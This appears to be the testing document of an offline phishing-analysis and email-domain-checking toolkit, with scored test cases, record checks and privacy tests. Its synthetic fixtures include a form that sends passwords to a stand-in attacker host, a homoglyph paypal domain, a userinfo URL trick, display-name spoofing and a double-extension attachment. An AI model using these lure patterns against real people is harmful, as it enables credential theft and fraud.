# Testing

Every case below was run against the code in this repository and the recorded
outcome is what the code actually produced, not what it was hoped to produce.

All fixtures are synthetic. **No real message from any real mailbox appears in
this repository, and none should ever be added.** If you need to reproduce a bug
in a real message, build a synthetic fixture that reproduces it and submit that
instead.

---

## How to run these by hand

The toolkit needs no test runner. Open `index.html`, save a fixture below as a
`.eml` file with CRLF line endings, and load it.

To build a fixture on Linux or macOS:

```
printf 'From: a@example.com\r\nSubject: t\r\n\r\nbody\r\n' > fixture.eml
```

Header lines must be separated from the body by one completely empty line.

---

## 1. Email analyzer

Expected scores follow the weight table in `METHODOLOGY.md`. If you change a
weight, these numbers change with it, which is the point of recording them.

### Base fixture

Several cases below are modifications of this one. On its own it is a clean,
fully authenticated message.

```
Return-Path: <billing@example.com>
Received: from mx.example.com (mx.example.com [198.51.100.10]) by mail.recipient.example (Postfix) with ESMTPS id A1B2C3; Tue, 3 Feb 2026 09:14:22 +0200
Authentication-Results: mail.recipient.example; spf=pass smtp.mailfrom=example.com; dkim=pass header.d=example.com; dmarc=pass header.from=example.com
DKIM-Signature: v=1; a=rsa-sha256; d=example.com; s=selector1; h=from:subject:date; b=AbCdEf
From: "Example Billing" <billing@example.com>
To: office@recipient.example
Subject: =?UTF-8?B?0KTQsNC60YLRg9GA0LAgMTIzNA==?=
Date: Tue, 3 Feb 2026 09:14:00 +0200
Message-ID: <20260203.a1@example.com>
Content-Type: text/plain; charset=UTF-8

Здравейте, прикачената фактура е за месец януари.
Подробности: https://example.com/invoices/1234
```

### Results

| # | Case | Change from the base fixture | Expected indicators | Score | Verdict |
| --- | --- | --- | --- | --- | --- |
| 1 | SPF, DKIM and DMARC all pass | none | none | 0 | Low technical suspicion |
| 2 | DMARC fail | `dmarc=pass` becomes `dmarc=fail`, `spf=pass` becomes `spf=fail` | `dmarc_fail`, `spf_fail` | 7 | High technical suspicion |
| 3 | Reply-To mismatch | add `Reply-To: accounts-payable@secure-billing-portal.top` | `replyto_mismatch` | 3 | Moderate technical suspicion |
| 4 | Return-Path mismatch | `Return-Path: <bounce@mailer-92.marketing-cloud.example>` | `returnpath_mismatch` | 1 | Low technical suspicion |
| 5 | Punycode, numeric host and shortener | body URL becomes `https://xn--pypal-4ve.com/login`, `http://198.51.100.77/pay`, `https://bit.ly/3xYz` | `url_punycode`, `url_ip_host`, `url_shortener` | 7 | High technical suspicion |
| 6 | Link text mismatch, form, redirect parameter | see the HTML fixture below | `html_form`, `url_text_mismatch`, `url_redirect_param` | 9 | High technical suspicion |
| 7 | Userinfo trick | body URL becomes `https://example.com@evil.test/login` | `url_userinfo` | 3 | Moderate technical suspicion |
| 8 | Malformed authentication header | `Authentication-Results: mail.recipient.example; spf= ; dkim==broken; dmarc` | `auth_malformed` | 1 | Low technical suspicion |
| 9 | No authentication headers and nothing else | see the minimal fixture below | `auth_absent` | 1 | Insufficient evidence |
| 10 | Many Received hops | fourteen additional `Received` lines prepended | `received_many` | 1 | Low technical suspicion |
| 11 | Attachments, double extension and macro | see the attachment fixture below | `att_executable`, `att_double_ext`, `att_macro` | 11 | High technical suspicion |
| 12 | Display name carrying another address | see the display name fixture below | `display_address_mismatch`, `dkim_absent` | 4 | Moderate technical suspicion |
| 13 | windows-1251 header and body | see the encoding fixture below | `auth_absent` | 1 | Low technical suspicion |

Case 9 is worth reading twice. The score is 1 but the verdict is Insufficient
evidence, not Low technical suspicion. With no authentication results, no URLs,
no attachments and no routing information, there is nothing to judge, and
reporting low suspicion would be a false reassurance.

### Case 6 fixture, link text mismatch and embedded form

```
Received: from a.example (a.example [203.0.113.9]) by b.example; Tue, 3 Feb 2026 09:00:00 +0200
Authentication-Results: b.example; spf=pass smtp.mailfrom=example.com; dkim=pass header.d=example.com; dmarc=pass header.from=example.com
From: Bank <alerts@example.com>
To: user@recipient.example
Subject: Verify
Date: Tue, 3 Feb 2026 09:00:00 +0200
Content-Type: text/html; charset=UTF-8

<html><body><p>Please visit
<a href="https://secure-login.attacker-domain.test/verify?url=https%3A%2F%2Fbank.example">www.bank.example</a></p>
<form action="https://attacker-domain.test/collect"><input name="pw"></form></body></html>
```

Note that authentication passes here. A message can be perfectly authenticated
and still be hostile, because authentication proves which domain sent the
message, not whether that domain is honest. This fixture exists to make sure the
analyzer does not let a `dmarc=pass` suppress the URL findings.

### Case 9 fixture, minimal message

```
From: someone@example.com
To: user@recipient.example
Subject: Hello
Date: Tue, 3 Feb 2026 09:00:00 +0200
Content-Type: text/plain

Just a note, no links here.
```

### Case 11 fixture, attachments

```
Received: from a.example (a.example [203.0.113.9]) by b.example; Tue, 3 Feb 2026 09:00:00 +0200
Authentication-Results: b.example; spf=pass smtp.mailfrom=example.com; dkim=pass header.d=example.com; dmarc=pass header.from=example.com
From: Supplier <sales@example.com>
To: user@recipient.example
Subject: Invoice
Date: Tue, 3 Feb 2026 09:00:00 +0200
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="XBOUND"

--XBOUND
Content-Type: text/plain; charset=UTF-8

See attached.
--XBOUND
Content-Type: application/octet-stream; name="invoice.pdf.exe"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="invoice.pdf.exe"

QUJDREVGRw==
--XBOUND
Content-Type: application/vnd.ms-excel.sheet.macroEnabled.12; name="report.xlsm"
Content-Disposition: attachment; filename="report.xlsm"
Content-Transfer-Encoding: base64

QUJD
--XBOUND--
```

Expected attachment metadata:

| Name | Declared type | Approximate size |
| --- | --- | --- |
| `invoice.pdf.exe` | `application/octet-stream` | 9 B |
| `report.xlsm` | `application/vnd.ms-excel.sheet.macroenabled.12` | 3 B |

Neither file is opened, decoded beyond its length, or written to disk.

### Case 12 fixture, display name carrying another address

```
Received: from a.example (a.example [203.0.113.9]) by b.example; Tue, 3 Feb 2026 09:00:00 +0200
Authentication-Results: b.example; spf=pass smtp.mailfrom=free.example; dkim=none; dmarc=none
From: "Ivan Petrov <ivan.petrov@realcompany.bg>" <attacker9931@free.example>
To: user@recipient.example
Subject: Urgent payment
Date: Tue, 3 Feb 2026 09:00:00 +0200
Content-Type: text/plain

Please change the bank account.
```

Expected parse: real address `attacker9931@free.example`, display name
`Ivan Petrov <ivan.petrov@realcompany.bg>`.

This is a regression test for a real defect. An address parser that takes the
first `<` finds the one inside the quoted display name and reports the attacker
message as coming from `realcompany.bg`, which is the exact opposite of the
truth. The parser must take the last angle addr-spec that sits outside quotes.

### Case 13 fixture, windows-1251

```
Received: from a.example (a.example [203.0.113.9]) by b.example; Tue, 3 Feb 2026 09:00:00 +0200
From: =?windows-1251?Q?=C8=E2=E0=ED_=CF=E5=F2=F0=EE=E2?= <ivan@example.bg>
To: user@recipient.example
Subject: =?windows-1251?Q?=D4=E0=EA=F2=F3=F0=E0?=
Date: Tue, 3 Feb 2026 09:00:00 +0200
Content-Type: text/plain; charset=windows-1251
Content-Transfer-Encoding: quoted-printable

=C7=E4=F0=E0=E2=E5=E9=F2=E5
```

Expected decoding:

| Field | Expected value |
| --- | --- |
| Display name | `Иван Петров` |
| Subject | `Фактура` |
| Body | `Здравейте` |

A UTF-8 equivalent must decode identically. This pair matters more than it
looks: a toolkit for Bulgarian organizations that mangles Cyrillic in a legacy
encoding is unusable for exactly the older systems most likely to be attacked.

### Punycode round trip

| Input | ASCII form | Decoded back |
| --- | --- | --- |
| `пример.бг` | `xn--e1afmkfd.xn--90ae` | `пример.бг` |
| `münchen.de` | `xn--mnchen-3ya.de` | `münchen.de` |
| `example.com` | `example.com` | `example.com` |
| `xn--pypal-4ve.com` | already ASCII | `pаypal.com`, where the third character is Cyrillic |

The last row is the one to check by eye. The decoded form looks like a familiar
brand and is not one.

---

## 2. Domain check

Each case is a record pasted into privacy mode. No network is used.

### SPF

| # | Record | Expected result |
| --- | --- | --- |
| 1 | empty | not present, missing |
| 2 | `v=spf1 include:_spf.google.com ~all` | valid, terminal `~`, 1 lookup, no issues |
| 3 | `v=spf1 ip4:198.51.100.0/24 -all` | valid, terminal `-`, 0 lookups, no issues |
| 4 | `v=spf1 +all` | valid, issue `spf_plus_all` |
| 5 | `v=spf1 ptr:example.com a mx` | valid, 3 lookups, issues `spf_ptr` and `spf_no_all` |
| 6 | eleven `include:` terms then `~all` | valid, 11 lookups, issue `spf_lookup_limit` |
| 7 | `include:foo ~all` | present but invalid, issue `spf_no_version` |
| 8 | `"v=spf1 include:_spf.exa" "mple.com -all"` | valid, terminal `-`, 1 lookup |

Case 8 covers the DoH JSON representation of a long TXT record, which arrives as
several quoted strings that must be joined with no separator. Joining them with
a space instead silently corrupts the domain name.

### DMARC

| # | Record | Expected result |
| --- | --- | --- |
| 1 | empty | not present |
| 2 | `v=DMARC1; p=none; rua=mailto:d@example.com` | policy `none`, effective `none` |
| 3 | `v=DMARC1; p=quarantine; rua=mailto:d@example.com; adkim=s; aspf=s` | policy `quarantine`, strict alignment |
| 4 | `v=DMARC1; p=reject; sp=reject; np=reject; rua=mailto:d@example.com; fo=1` | policy `reject`, `np` recognized |
| 5 | `v=DMARC1; p=reject; t=y; rua=mailto:d@example.com` | policy `reject`, test mode true |
| 6 | `v=DMARC1; p=quarantine; pct=50; rf=afrf; ri=86400; rua=mailto:d@example.com` | deprecated tags `pct`, `rf`, `ri`, issue `dmarc_deprecated_tags` |
| 7 | `v=DMARC1; rua=mailto:d@example.com` | no `p` tag, effective policy `none`, issue `dmarc_no_policy` |
| 8 | `v=DMARC1; p=reject; rua=http://example.com/x` | issues `dmarc_bad_uri` and `dmarc_no_rua` |
| 9 | `p=reject` | invalid, issue `dmarc_no_version` |

Cases 5, 6 and 7 are the RFC 9989 behaviours. Case 5 in particular: a record
that reads `p=reject` while carrying `t=y` enforces nothing, and a checker that
reports it as fully protected is giving dangerous reassurance.

### DKIM, MTA-STS, TLS-RPT, BIMI

| # | Record | Expected result |
| --- | --- | --- |
| 1 | `v=DKIM1; k=rsa; p=<216 base64 characters>` | valid, key present |
| 2 | `v=DKIM1; k=rsa; p=` | invalid, revoked, issue `dkim_revoked` |
| 3 | DKIM field left empty | not present, state Unknown, not counted in the score |
| 4 | `v=STSv1; id=20260101T000000Z` | valid, with a note that the policy file was not fetched |
| 5 | `v=TLSRPTv1; rua=mailto:tls@example.com` | valid |
| 6 | `v=BIMI1; l=https://example.com/logo.svg` | valid, informational only, contributes 0 points |

Case 3 is the important one. An empty DKIM field must produce Unknown rather
than Missing, and must not reduce the maximum available score.

### Posture scoring

| Domain state | Points | Posture |
| --- | --- | --- |
| nothing configured | 0 / 10 | Basic |
| SPF `~all` only | 2 / 10 | Basic |
| SPF `~all` and DMARC `p=none` with `rua` | 5 / 10 | Intermediate |
| SPF `-all`, DMARC `p=reject` with `rua`, DKIM found, MTA-STS, TLS-RPT | 12 / 12 | Strong |
| the same, but DMARC carries `t=y` | 11 / 12 | Intermediate |

The last two rows differ by one tag and one posture level. That is the intended
behaviour.

### Query plan

For the domain `пример.бг` with selectors `selector1` and `google`, the consent
dialog must list exactly these names before anything is sent:

```
xn--e1afmkfd.xn--90ae                        MX
xn--e1afmkfd.xn--90ae                        TXT
_dmarc.xn--e1afmkfd.xn--90ae                 TXT
_mta-sts.xn--e1afmkfd.xn--90ae               TXT
_smtp._tls.xn--e1afmkfd.xn--90ae             TXT
default._bimi.xn--e1afmkfd.xn--90ae          TXT
selector1._domainkey.xn--e1afmkfd.xn--90ae   TXT
google._domainkey.xn--e1afmkfd.xn--90ae      TXT
```

An invalid input such as `not a domain` must produce an empty plan and no
request.

---

## 3. Organizational assessment

Six profiles, each answering all sixteen questions.

| # | Scenario | Exposure | Maturity | Criticality | Capacity and finance | Level |
| --- | --- | --- | --- | --- | --- | --- |
| 1 | Small, primarily internal organization | Low | Initial, 1 of 16 | Low | H0, F0 | P1 |
| 2 | Accounting firm | Medium | Developing, 6 of 16 | High | H1, F1 | P3 |
| 3 | Outsourcing company | High | Established, 13 of 16 | Medium | H2, F2 | P3 |
| 4 | Recruitment agency | High | Developing, 6 of 16 | Medium | H1, F1 | P3 |
| 5 | E-commerce company | High | Established, 15 of 16 | High | H2, F2 | P3 |
| 6 | Small technology company | Medium | Established, 16 of 16 | Medium | H3, F3 | P2 |

### What each scenario must demonstrate

**1. Small internal organization.** Receives the full baseline: multi factor
authentication, a reporting path, incident contacts, a forwarding audit, SPF and
DMARC monitoring. Receives nothing in the additional protection horizon, because
recommending MTA-STS to an organization with no IT resource is advice that will
not be followed.

**2. Accounting firm.** The phone callback rule for payment changes must appear
in the first horizon. Phishing resistant authentication for critical roles must
appear, since criticality is High. At F1, both `mfa-resistant-all` and
`external-support` must be deferred rather than hidden, with their requirement
shown as `F2` and `F3`.

**3. Outsourcing company.** Already has multi factor authentication everywhere
and DMARC monitoring, so those recommendations must be absent rather than
repeated. The external file handling workflow must appear, and DMARC must move
towards quarantine rather than reject.

**4. Recruitment agency.** The critical case for the exposure logic. The
exposure explanation must end with the statement that an unknown sender is not
by itself an indicator for this organization, and the recommendation set must
include the external file handling workflow instead of advice to be suspicious
of unknown senders.

**5. E-commerce company.** Already enforces DMARC, so `dmarc-reject` and
`spf-hardfail` appear as refinements and BIMI becomes available, listed last and
labelled as recognizability rather than security.

**6. Small technology company.** Highest maturity with the most capacity. Very
few recommendations remain, which is the correct outcome. A tool that always
produces a long list regardless of the answers is not assessing anything.

### Invariants across all six

- No question asks for a company name, personal name, email address, domain, IP address, phone number, customer name or account name.
- No threshold anywhere is expressed in currency.
- Every dimension reports which answers produced it.
- The recommended protection level depends on exposure and criticality only, never on maturity or budget. A poor organization with high exposure still gets P3, with a longer path to reach it.

---

## 4. Privacy tests

These are the tests that matter most, because a failure here is not a wrong
answer but a broken promise.

| # | Check | Method | Expected |
| --- | --- | --- | --- |
| 1 | No request during `.eml` analysis | Open the browser network tab, load a message containing links and remote images, run the analysis | Zero requests |
| 2 | No automatic domain check | Load an `.eml`, then open Check domain | The sender domain is offered as a button, and nothing is queried until it is pressed |
| 3 | Consent before any lookup | Enter a domain in online mode | The exact list of names appears; the run button stays disabled until the box is ticked |
| 4 | No persistence | Analyze a message, then inspect Application storage | `localStorage`, `sessionStorage`, cookies and IndexedDB are all empty |
| 5 | Reset clears memory | Fill everything in, press Reset everything | All results and fields are empty |
| 6 | Reload clears memory | Analyze a message, reload the page | Nothing is restored |
| 7 | No external resources | Load the page with no network connection at all | Everything except the online lookup works, with no console errors |
| 8 | No script execution from a message | Load a message whose HTML contains a script tag and an image with a remote source | Only sanitized text is shown, no request is made, and no script tag exists anywhere in the result |
| 9 | Works from `file://` | Open `index.html` directly from disk | Every section renders |

Test 8 can be verified in the page itself: the rendered result must contain no
`script` element and no element with an external source. All message derived
values are inserted as text, never as markup.

---

## 5. Accessibility and layout

| # | Check | Expected |
| --- | --- | --- |
| 1 | Keyboard only navigation | Every control is reachable and has a visible focus outline |
| 2 | Narrow viewport | Usable at roughly 360 pixels wide with no horizontal scrolling of the page body |
| 3 | Colour is not the only signal | Every status pill carries a text label as well as a colour |
| 4 | Reduced motion | With the reduced motion preference set, no transitions run |
| 5 | Language switch | Switching between Bulgarian and English changes every visible string, including rendered results |
| 6 | Zoom | Readable at 200 percent zoom |

Check 3 is not decorative. A red pill that means nothing to a reader with colour
vision deficiency is a defect in a tool whose entire purpose is communicating
risk.
